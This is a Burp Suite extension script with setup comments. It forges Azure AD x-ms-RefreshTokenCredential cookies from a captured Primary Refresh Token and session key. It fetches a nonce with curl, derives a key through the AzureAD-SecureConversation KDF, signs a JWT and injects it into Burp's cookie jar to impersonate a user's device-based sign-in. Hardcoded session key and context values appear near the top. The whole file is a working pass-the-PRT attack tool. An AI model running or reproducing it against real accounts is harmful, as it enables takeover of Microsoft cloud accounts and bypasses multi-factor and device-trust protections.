#Burp Session handling:
#1) scope: Host: ^login.microsoftonline.com
#          File: /.*/oauth2/v2.0/authorize.*
#2) Tools Scope: proxy only
#3) Rule Actions: 
#         - Run macro: GetNonce
#         - Use cookies from session handling jar - only x-ms-RefreshTokenCredential
#Burp macro GetNonce:
#		run curl via burp and select request in proxy
#			curl -x http://127.0.0.1:8080 -k -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042' --data-binary 'grant_type=srv_challenge&windows_api_version=2.0&resource=https%3a%2f%2fcdpcs.access.microsoft.com' 'https://login.microsoftonline.com/common/oauth2/token'
#		Unselect "Add cookies..." and "Use cookies ...."


#Microsoft AAD session key
key = "81b89fa1e95f69a6975e3fc806d3968d02082c5557d6e0a606ae75c5dc476afc"

prt="0.AX0A..."

context="QTkForqEKaCwkkjj1F/eRK6LmjHIXIOP"

kdfv2 = True

from burp import ICookie


class Cookie(ICookie):
    
    def getDomain(self):
        return self.cookie_domain

    def getPath(self):
        return self.cookie_path

    def getExpiration(self):
        return self.cookie_expiration

    def getName(self):
        return self.cookie_name

    def getValue(self):
        return self.cookie_value

    def __init__(self, cookie_domain=None, cookie_name=None, cookie_value=None, cookie_path=None, cookie_expiration=None):
        self.cookie_domain = cookie_domain
        self.cookie_name = cookie_name
        self.cookie_value = cookie_value
        self.cookie_path = cookie_path
        self.cookie_expiration = cookie_expiration


def calculate_derived_key(sessionkey, context=None):
        import binascii
        from  javax.crypto import Mac;
        from  javax.crypto.spec import SecretKeySpec;

        label = "AzureAD-SecureConversation"
        hmacSecret="\x00\x00\x00\x01" + label + "\x00" + context + "\x00\x00\x01\x00"
        #print("hmacSecret key: " + binascii.hexlify(hmacSecret))

        mac = Mac.getInstance("HmacSHA256")
        secretKeySpec = SecretKeySpec(sessionkey, "HmacSHA256");
        mac.init(secretKeySpec);
        hmacSha256 = mac.doFinal(hmacSecret);

        return hmacSha256

if toolFlag in (callbacks.TOOL_REPEATER, callbacks.TOOL_SCANNER, callbacks.TOOL_EXTENDER, callbacks.TOOL_PROXY ):

    #apply only to resonse
    if not messageIsRequest:
        import re
        import json
        import jwt
        import hashlib
        import base64
        from collections import OrderedDict
        import os
        import binascii

        response = helpers.bytesToString(messageInfo.getResponse())
        match = re.search(r'{"Nonce":"(.*)"}', response,re.DOTALL|re.IGNORECASE)
        if match:
            print("Got nonce match")

            Nonce = match.group(1)

            
            payload={"refresh_token":prt,"is_primary":"true","request_nonce":Nonce}
            if kdfv2:
                
                kdf2string = base64.b64decode(context) + json.dumps(payload).replace(' ', '').encode('ascii')
                headers={'typ':'JWT','alg':'HS256','kdf_ver':2,'ctx':context.replace("=","")}
                context = base64.b64encode(hashlib.sha256(kdf2string).digest())
            else:
                headers={'typ':'JWT','alg':'HS256','ctx':context.replace("=","")}


            #calculate derived_key
            print("Context: "+context+"   "+binascii.hexlify(base64.b64decode(context)))
            derived_key = calculate_derived_key(binascii.unhexlify(key), base64.b64decode(context))
            print("Derived key: " + binascii.hexlify(derived_key))

            #signing with derived key and encode jwt
            encodedjwt = jwt.encode(payload, derived_key.tostring(), algorithm="HS256", headers=headers)
            print(encodedjwt)

            newcookie = Cookie("login.microsoftonline.com","x-ms-RefreshTokenCredential",encodedjwt,"/")
            callbacks.updateCookieJar(newcookie)
            print("cookie.jar updated")
           

